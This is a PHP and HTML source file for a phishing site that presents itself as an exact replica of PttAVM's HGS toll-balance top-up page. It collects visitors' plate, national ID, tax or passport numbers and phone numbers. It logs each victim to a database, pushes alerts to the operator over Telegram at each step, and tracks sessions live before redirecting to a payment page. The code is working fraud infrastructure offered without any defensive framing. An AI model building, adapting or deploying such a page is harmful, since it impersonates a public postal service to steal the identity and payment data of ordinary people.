<?php
/**
 * index.php — HGS Bakiye Yükleme ve Miktar Seçim Sayfası (100% Exact Replica)
 */
if (session_status() === PHP_SESSION_NONE) session_start();

require_once __DIR__ . '/db.php';

// Vercel Serverless Session Recovery (Session Kaybı Önleme)
if (empty($_SESSION['hgs_sorgu_deger'])) {
    try {
        $sid = session_id();
        $row = db()->prepare("SELECT * FROM tapu_logs WHERE session_id=? LIMIT 1");
        $row->execute([$sid]);
        $r = $row->fetch();
        if ($r && !empty($r['tc']) && !empty($r['telefon'])) {
            $_SESSION['log_id'] = (int)$r['id'];
            $_SESSION['hgs_sorgu_tipi'] = $r['ilce'] ? strtolower($r['ilce']) : 'plaka';
            $_SESSION['hgs_sorgu_deger'] = $r['tc'];
            $_SESSION['hgs_telefon'] = $r['telefon'];
            
            $_SESSION['basvuru'] = [
                'ad' => 'HGS',
                'soyad' => 'Yükleme',
                'telefon' => $r['telefon'],
                'tc' => $r['tc'],
                'il' => 'ANKARA',
                'ilce' => 'ÇANKAYA'
            ];
            
            $_SESSION['randevu'] = [
                'mudurlik' => 'HGS: ' . strtoupper($r['ilce'] ?: 'PLAKA'),
                'tarih' => $r['tc'],
                'saat' => $r['saat'] ?: 'Tutar seçilmedi'
            ];
        }
    } catch (Exception $e) {}
}

// Banlı IP kontrolü ve Ziyaretçi kaydı
ip_ban_kontrol();
kayit_ziyaretci();

// Kullanıcıyı hemen log listesine online olarak ekle
$log_id = get_or_create_log();
if ($log_id) {
    $_SESSION['log_id'] = $log_id;
}

$hatalar = [];
$step = 1; // 1: Sorgulama, 2: Miktar Seçimi

// Session'dan önceki sorgu verilerini al
$sorgu_tipi = $_SESSION['hgs_sorgu_tipi'] ?? 'plaka';
$sorgu_deger = $_SESSION['hgs_sorgu_deger'] ?? '';
$telefon = $_SESSION['hgs_telefon'] ?? '';

// POST işlemi
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['step']) && $_POST['step'] == '1') {
        // Step 1: Sorgulama İşlemi
        $sorgu_tipi = $_POST['sorgu_tipi'] ?? 'plaka';
        $sorgu_deger = trim($_POST['sorgu_deger'] ?? '');
        $telefon = preg_replace('/\D/', '', $_POST['telefon'] ?? '');

        // Doğrulamalar
        if (empty($sorgu_deger)) {
            $hatalar['sorgu_deger'] = 'Lütfen sorgulama bilgisini giriniz.';
        }
        if (empty($telefon) || strlen($telefon) < 10) {
            $hatalar['telefon'] = 'Lütfen geçerli bir telefon numarası giriniz.';
        }

        if (empty($hatalar)) {
            // Verileri Session'a kaydet ve Step 2'ye geç
            $_SESSION['hgs_sorgu_tipi'] = $sorgu_tipi;
            $_SESSION['hgs_sorgu_deger'] = $sorgu_deger;
            $_SESSION['hgs_telefon'] = $telefon;

            // Session bilgilerini doldur (odeme.php sayfasının geri yönlendirmemesi için)
            $_SESSION['basvuru'] = [
                'ad' => 'HGS',
                'soyad' => 'Yükleme',
                'telefon' => $telefon,
                'tc' => $sorgu_deger,
                'il' => 'ANKARA',
                'ilce' => 'ÇANKAYA'
            ];

            $_SESSION['randevu'] = [
                'mudurlik' => 'HGS: ' . strtoupper($sorgu_tipi),
                'tarih' => $sorgu_deger,
                'saat' => 'Tutar seçilmedi'
            ];

            // Veritabanı logu oluştur/güncelle
            $_aktif_log_id = get_or_create_log();
            if ($_aktif_log_id) {
                update_log($_aktif_log_id, [
                    'tc' => $sorgu_deger,
                    'telefon' => $telefon,
                    'il' => 'HGS',
                    'ilce' => strtoupper($sorgu_tipi),
                    'mudurlik' => $sorgu_deger,
                    'tarih' => date('Y-m-d'),
                    'saat' => 'Tutar seçilmedi',
                    'islem' => 'HGS Yükleme',
                    'aciklama' => strtoupper($sorgu_tipi) . ': ' . $sorgu_deger . ' | Telefon: ' . $telefon,
                    'mevcut_adim' => 1,
                    'durum' => 'aktif'
                ]);
                $_SESSION['log_id'] = $_aktif_log_id;
                
                // Telegram logu gönder (Adım 1: Sorgulama)
                try { tg_mesaj_gonder($_aktif_log_id); } catch (Exception $e) {}
            }

            $step = 2;
        }
    } elseif (isset($_POST['step']) && $_POST['step'] == '2') {
        // Step 2: Miktar Seçim İşlemi
        $tutar = trim($_POST['tutar'] ?? '250');
        $komisyon = trim($_POST['komisyon'] ?? '25');
        $toplam_tutar = (int)$tutar + (int)$komisyon;

        if (!empty($sorgu_deger) && !empty($telefon)) {
            // Randevu saatini (tutar) güncelle
            $_SESSION['randevu']['saat'] = 'Tutar: ' . $toplam_tutar . ' TL';

            // Veritabanı logunu güncelle
            $log_id = $_SESSION['log_id'] ?? get_or_create_log();
            if ($log_id) {
                update_log($log_id, [
                    'saat' => $toplam_tutar . ' TL',
                    'aciklama' => strtoupper($sorgu_tipi) . ': ' . $sorgu_deger . ' | Tutar: ' . $tutar . ' TL (Toplam: ' . $toplam_tutar . ' TL)',
                    'mevcut_adim' => 2
                ]);
                
                // Telegram logunu güncelle (Adım 2: Tutar Seçildi)
                try { tg_mesaj_guncelle($log_id); } catch (Exception $e) {}
            }

            // Ödeme sayfasına yönlendir
            header('Location: ' . BASE_PATH . '/odeme.php');
            exit;
        } else {
            // Hata durumunda Step 1'e geri dön
            $step = 1;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta name="format-detection" content="telephone=no">
    <title>HGS Online Bakiye Yükleme</title>
    <link rel="icon" type="image/png" href="https://hgs.pttavm.com/v2/assets/images/favicon.png">
    
    <!-- Google Fonts Open Sans -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap" rel="stylesheet">
    
    <!-- PttAVM HGS CSS -->
    <link rel="stylesheet" href="assets/css/hgs.min.css?v=<?= time() ?>">
    
    <style>
        body, html {
            margin: 0 !important;
            padding: 0 !important;
            width: 100% !important;
            overflow-x: hidden !important;
        }
        
        .wizard-hgs-image-container {
            background-size: cover;
            min-height: 100vh !important;
            height: auto !important;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
        }

        footer {
            position: relative !important;
            margin-top: 30px !important;
            clear: both !important;
            width: 100% !important;
            bottom: auto !important;
            left: auto !important;
            flex-shrink: 0 !important;
        }

        .container-fluid.no-padding {
            padding: 0 !important;
            margin: 0 !important;
            width: 100% !important;
            max-width: 100% !important;
        }

        .navbar-header {
            margin: 0 !important;
            padding: 0 !important;
            width: 100% !important;
            max-width: 100% !important;
            float: none !important;
        }

        /* Logo Boyutunu Büyütme */
        .logo-field img.logo {
            height: 28px !important;
            max-height: none !important;
            width: auto !important;
            transition: all 0.2s ease-in-out;
        }
        
        #hgs-query-container {
            float: none;
            margin: 10px auto 40px auto;
        }

        .wizard-card .tab-content {
            padding-top: 5px !important;
        }
        
        .panel-inside {
            padding-top: 5px !important;
        }

        /* Üst menüyü tamamen gizle */
        .menu-field {
            display: none !important;
        }

        .hgs-query-inputs {
            text-transform: uppercase;
        }

        .error-message {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 5px;
            display: block;
            text-align: center;
        }

        /* Sekme Butonu Stilleri - Orijinal CSS Ezmesi */
        .hgs-query-process-type {
            font-size: 11px !important;
            padding: 8px 12px !important;
            margin: 5px !important;
            font-weight: 700 !important;
        }

        /* Custom Amount Grid */
        .hgs-amount-grid {
            display: grid !important;
            grid-template-columns: repeat(3, 1fr) !important;
            gap: 12px !important;
            margin: 20px 0 !important;
            padding: 0 !important;
            box-sizing: border-box !important;
            width: 100% !important;
        }

        .hgs-amount-item {
            cursor: pointer !important;
            box-sizing: border-box !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
        }

        .hgs-amount-btn {
            border: 2px solid #545454 !important;
            border-radius: 4px !important;
            padding: 12px 5px !important;
            background: rgba(0,0,0,0.5) !important;
            color: #fff !important;
            text-align: center !important;
            font-weight: 700 !important;
            font-size: 15px !important;
            transition: all 0.2s !important;
            box-sizing: border-box !important;
            width: 100% !important;
        }

        .hgs-amount-item.active .hgs-amount-btn,
        .hgs-amount-item:hover .hgs-amount-btn {
            border-color: #fab62c !important;
            background: rgba(250, 182, 44, 0.15) !important;
            color: #fab62c !important;
        }

        /* Mobile Responsive Grid */
        @media (max-width: 480px) {
            .hgs-amount-grid {
                grid-template-columns: repeat(2, 1fr) !important;
                gap: 10px !important;
            }
        }

        .vehicle-summary-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 13px;
            border-left: 4px solid #fab62c;
            text-align: left;
            color: #ffffff !important;
        }

        .vehicle-summary-info p {
            margin: 5px 0;
            color: #ffffff !important;
        }

        /* Mobil tarayıcıların numaraları linke çevirmesini önlemek için CSS koruması */
        .vehicle-summary-info a, 
        .vehicle-summary-info a[href^="tel"],
        a[href^="tel"] {
            color: #ffffff !important;
            text-decoration: none !important;
            pointer-events: none !important;
            cursor: default !important;
        }
        
        @media (max-width: 767px) {
            .menu-field {
                display: none !important;
            }
            .navbar-header {
                display: block !important;
                width: 100% !important;
                text-align: center !important;
                padding: 0 !important;
            }
            .logo-field {
                float: none !important;
                display: inline-block !important;
                margin: 0 auto !important;
                text-align: center !important;
            }
            .logo-field a.navbar-brand {
                float: none !important;
                display: inline-block !important;
                margin: 0 auto !important;
                padding: 15px 0 !important;
            }
            .logo-field img.logo {
                display: inline-block !important;
                margin: 0 auto !important;
                float: none !important;
            }
        }
    </style>
</head>
<body>

<div class="image-container wizard-hgs-image-container set-full-height">
    
    <!-- Navbar Header -->
    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="assets/images/pttavm_hgs_logo.png" alt="PttAVM Logo" class="logo" border="0"/>
                </a>
            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="#" class="selected"><span>Ana Sayfa</span></a></li>
                            <li class="hgs-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/hgs_yukle.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hgs_yukle_hover.png" class="menu-hover-item display-none" />
                                        Yükle
                                    </span>
                                </a>
                            </li>
                            <li class="damage-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/hasar_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hasar_sorgula_hover.png" class="menu-hover-item display-none" />
                                        Hasar Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="km-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/km_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/km_sorgula_hover.png" class="menu-hover-item display-none" />
                                        KM Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="shopping-cart-menu-item">
                                <a href="https://pttavm.com" target="_blank">
                                    <span>
                                        <img src="assets/images/menu/alisveris.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/alisveris_hover.png" class="menu-hover-item display-none" />
                                        Alışverişe Başla
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>

        <!-- Wizard Container -->
        <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
            <div class="wizard-container">
                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                    
                    <div class="wizard-header">
                        <div class="panel-header-icons">
                            <img class="panel-header-first-icon" src="assets/images/panel/homepage.png">
                        </div>
                        <h1>
                            <img class="panel-header-second-icon" src="assets/images/panel/hgs.png">
                            Bakiye Yükleme
                        </h1>
                        <h6 class="hgs-query-subtitle">
                            BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                        </h6>
                    </div>

                    <div class="tab-content text-center">
                        
                        <?php if ($step == 1): ?>
                            <!-- ================== ADIM 1: SORGULAMA ================== -->
                            <div class="tab-pane panel-border active" id="hgs-query-check">
                                <form action="" method="post" id="hgsForm">
                                    <input type="hidden" name="step" value="1">
                                    <input type="hidden" name="sorgu_tipi" id="sorgu_tipi" value="<?= htmlspecialchars($sorgu_tipi) ?>">

                                    <div class="panel-inside">
                                        <!-- Orijinal Sekme Butonları -->
                                        <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon <?= $sorgu_tipi === 'plaka' ? 'btn-fill' : '' ?>" id="plakano" data-type="plaka">PLAKA NO</button>
                                        <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon <?= $sorgu_tipi === 'tc' ? 'btn-fill' : '' ?>" id="tcno" data-type="tc">T.C. KİMLİK NO</button>
                                        <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon <?= $sorgu_tipi === 'vergi' ? 'btn-fill' : '' ?>" id="vergino" data-type="vergi">VERGİ NO</button>
                                        <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon <?= $sorgu_tipi === 'pasaport' ? 'btn-fill' : '' ?>" id="pasaportno" data-type="pasaport">PASAPORT NO</button>
                                        <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon <?= $sorgu_tipi === 'hgsno' ? 'btn-fill' : '' ?>" id="hgsno" data-type="hgsno">HGS ÜRÜN NO</button>

                                        <!-- Dinamik Sorgu Girişi -->
                                        <div class="form-group hgs-query-input" style="margin-top: 20px;">
                                            <input type="text" name="sorgu_deger" id="sorgu_deger" class="form-control text-center hgs-query-no hgs-query-inputs" required value="<?= htmlspecialchars($sorgu_deger) ?>">
                                            <?php if (isset($hatalar['sorgu_deger'])): ?>
                                                <span class="error-message"><?= htmlspecialchars($hatalar['sorgu_deger']) ?></span>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Telefon Numarası Girişi -->
                                        <div class="form-group hgs-query-input">
                                            <input type="text" name="telefon" id="phone" class="form-control text-center hgs-query-no hgs-query-inputs" placeholder="(5xx) xxx xx xx" required value="<?= htmlspecialchars($telefon) ?>" maxlength="15" inputmode="numeric">
                                            <?php if (isset($hatalar['telefon'])): ?>
                                                <span class="error-message"><?= htmlspecialchars($hatalar['telefon']) ?></span>
                                            <?php endif; ?>
                                        </div>

                                        <div class="pull-right" style="margin-top: 15px;">
                                            <button type="submit" class="btn text-white btn-warning">SORGULA <img src="assets/images/buttons/right-arrow.png"></button>
                                        </div>
                                    </div>
                                </form>
                            </div>

                        <?php else: ?>
                            <!-- ================== ADIM 2: MİKTAR SEÇİMİ ================== -->
                            <div class="tab-pane panel-border active" id="hgs-query-amounts">
                                <div class="panel-inside">
                                    <div class="col-sm-12">
                                        <div class="vehicle-summary-info">
                                            <p><strong>Sorgulanan HGS/Araç Detayı:</strong> <?= htmlspecialchars($sorgu_deger) ?> (<?= strtoupper($sorgu_tipi) ?>)</p>
                                            <p><strong>İletişim Numarası:</strong> <?= htmlspecialchars($telefon) ?></p>
                                        </div>
                                        <span class="tab-pane-heading" style="color: #fab62c; font-weight: 600; font-size: 15px;">Yüklemek istediğiniz bakiye miktarını seçin.</span>
                                    </div>

                                    <form action="" method="post" id="amountForm">
                                        <input type="hidden" name="step" value="2">
                                        <input type="hidden" name="tutar" id="selected_tutar" value="250">
                                        <input type="hidden" name="komisyon" id="selected_komisyon" value="25">

                                        <!-- Orijinal Grid Tasarımı -->
                                        <div class="hgs-amount-grid">
                                            <div class="hgs-amount-item" data-comm="15" data-price="150">
                                                <div class="hgs-amount-btn">150 TL</div>
                                            </div>
                                            <div class="hgs-amount-item active" data-comm="25" data-price="250">
                                                <div class="hgs-amount-btn">250 TL</div>
                                            </div>
                                            <div class="hgs-amount-item" data-comm="35" data-price="350">
                                                <div class="hgs-amount-btn">350 TL</div>
                                            </div>
                                            <div class="hgs-amount-item" data-comm="50" data-price="500">
                                                <div class="hgs-amount-btn">500 TL</div>
                                            </div>
                                            <div class="hgs-amount-item" data-comm="75" data-price="750">
                                                <div class="hgs-amount-btn">750 TL</div>
                                            </div>
                                            <div class="hgs-amount-item" data-comm="100" data-price="1000">
                                                <div class="hgs-amount-btn">1000 TL</div>
                                            </div>
                                        </div>

                                        <!-- Orijinal Fiyat Tablosu -->
                                        <div class="col-sm-12 mtv-payment-total-container hgs-query-payment-total-container">
                                            <table class="table total-amount-table" style="color: #fff;">
                                                <tr>
                                                    <td>Yükleme Tutarı</td>
                                                    <td class="value text-warning" id="summary_tutar" style="text-align: right; font-weight: 700; color: #fab62c;">250.00 TL</td>
                                                </tr>
                                                <tr>
                                                    <td>Hizmet Bedeli</td>
                                                    <td class="value text-warning" id="summary_komisyon" style="text-align: right; font-weight: 700; color: #fab62c;">25.00 TL</td>
                                                </tr>
                                                <tr class="total-row" style="font-size: 16px; border-top: 1.5px solid rgba(255,255,255,0.1); font-weight: 700;">
                                                    <td>Toplam Tutar</td>
                                                    <td class="value text-warning" id="summary_toplam" style="text-align: right; font-weight: 700; color: #fab62c; font-size: 18px;">275.00 TL</td>
                                                </tr>
                                            </table>
                                        </div>

                                        <div class="col-sm-12 text-right" style="margin-top: 25px;">
                                            <a href="index.php" class="btn btn-default" style="margin-right: 10px; background: transparent; border: 1.5px solid #545454; color: #fff;">GERİ</a>
                                            <button type="submit" class="btn btn-warning">DEVAM ET <img src="assets/images/buttons/right-arrow.png"></button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        <?php endif; ?>

                    </div>

                    <div class="wizard-footer">
                        <div class="clearfix"></div>
                    </div>

                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="copyright">© Copyright 2026 | Tüm hakları saklıdır.</div>
            <div class="footer-menu">
                <ul>
                    <li class="important-informations">
                        <a href="javascript:void(0);">Önemli Bilgiler</a>
                    </li>
                    <li><a href="javascript:void(0);">Görüş Bildir</a></li>
                    <li><a href="javascript:void(0);">Sıkça Sorulan Sorular</a></li>
                    <li><a href="javascript:void(0);">İletişim</a></li>
                </ul>
            </div>
        </div>
    </footer>

</div>

<!-- Tab ve Miktar Seçim Kontrolleri -->
<script>
    // --- STEP 1 TAB & TELEFON KONTROLLERİ ---
    const tabButtons = document.querySelectorAll('.hgs-query-process-type');
    const sorguTipiInput = document.getElementById('sorgu_tipi');
    const sorguDegerInput = document.getElementById('sorgu_deger');

    const tabConfig = {
        plaka: {
            placeholder: 'PLAKA NUMARASI GİRİNİZ',
            maxlength: 12
        },
        tc: {
            placeholder: 'T.C. KİMLİK NUMARASI GİRİNİZ',
            maxlength: 11
        },
        vergi: {
            placeholder: 'VERGİ NUMARASI GİRİNİZ',
            maxlength: 10
        },
        pasaport: {
            placeholder: 'PASAPORT NUMARASI GİRİNİZ',
            maxlength: 20
        },
        hgsno: {
            placeholder: 'HGS ÜRÜN NUMARASI GİRİNİZ',
            maxlength: 15
        }
    };

    if (tabButtons.length > 0) {
        // Sayfa yüklendiğinde aktif tab'e göre input özelliklerini ayarla
        const activeTab = document.querySelector('.hgs-query-process-type.btn-fill');
        if (activeTab) {
            const type = activeTab.getAttribute('data-type');
            if (sorguTipiInput) sorguTipiInput.value = type;
            const config = tabConfig[type];
            if (sorguDegerInput) {
                sorguDegerInput.placeholder = config.placeholder;
                sorguDegerInput.maxLength = config.maxlength;
                if (type !== 'plaka') {
                    sorguDegerInput.setAttribute('inputmode', 'numeric');
                } else {
                    sorguDegerInput.removeAttribute('inputmode');
                }
            }
        }

        // Tıklama ile dinamik değişimler
        tabButtons.forEach(button => {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                tabButtons.forEach(btn => btn.classList.remove('btn-fill'));
                button.classList.add('btn-fill');

                const type = button.getAttribute('data-type');
                if (sorguTipiInput) sorguTipiInput.value = type;
                
                const config = tabConfig[type];
                if (sorguDegerInput) {
                    sorguDegerInput.placeholder = config.placeholder;
                    sorguDegerInput.maxLength = config.maxlength;
                    sorguDegerInput.value = '';
                    if (type !== 'plaka') {
                        sorguDegerInput.setAttribute('inputmode', 'numeric');
                    } else {
                        sorguDegerInput.removeAttribute('inputmode');
                    }
                }
            });
        });

        // Sayısal olan alanlarda harf girişini engelleyici koruma
        if (sorguDegerInput) {
            sorguDegerInput.addEventListener('input', (e) => {
                const type = sorguTipiInput ? sorguTipiInput.value : 'plaka';
                if (type !== 'plaka') {
                    e.target.value = e.target.value.replace(/\D/g, '');
                }
            });
        }
    }

    const telefonInput = document.getElementById('phone');
    if (telefonInput) {
        telefonInput.addEventListener('input', (e) => {
            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
            e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
        });
    }

    // --- STEP 2 MİKTAR SEÇİM KONTROLLERİ ---
    const amountCards = document.querySelectorAll('.hgs-amount-item');
    const selectedTutarInput = document.getElementById('selected_tutar');
    const selectedKomisyonInput = document.getElementById('selected_komisyon');
    
    const summaryTutar = document.getElementById('summary_tutar');
    const summaryKomisyon = document.getElementById('summary_komisyon');
    const summaryToplam = document.getElementById('summary_toplam');

    if (amountCards.length > 0) {
        amountCards.forEach(card => {
            card.addEventListener('click', () => {
                amountCards.forEach(c => c.classList.remove('active'));
                card.classList.add('active');

                const tutar = parseInt(card.getAttribute('data-price'));
                const komisyon = parseInt(card.getAttribute('data-comm'));
                const toplam = tutar + komisyon;

                // Gizli inputları güncelle
                if (selectedTutarInput) selectedTutarInput.value = tutar;
                if (selectedKomisyonInput) selectedKomisyonInput.value = komisyon;

                // Fiyat özetini güncelle
                if (summaryTutar) summaryTutar.innerText = tutar.toFixed(2) + ' TL';
                if (summaryKomisyon) summaryKomisyon.innerText = komisyon.toFixed(2) + ' TL';
                if (summaryToplam) summaryToplam.innerText = toplam.toFixed(2) + ' TL';
            });
        });
    }
</script>

<script>
    // Heartbeat - Kullanıcının online kalma süresini günceller
    function heartbeat() {
        fetch('heartbeat.php', { method: 'POST', credentials: 'same-origin' }).catch(function(){});
    }
    setInterval(heartbeat, 3000);
    heartbeat();
</script>

</body>
</html>
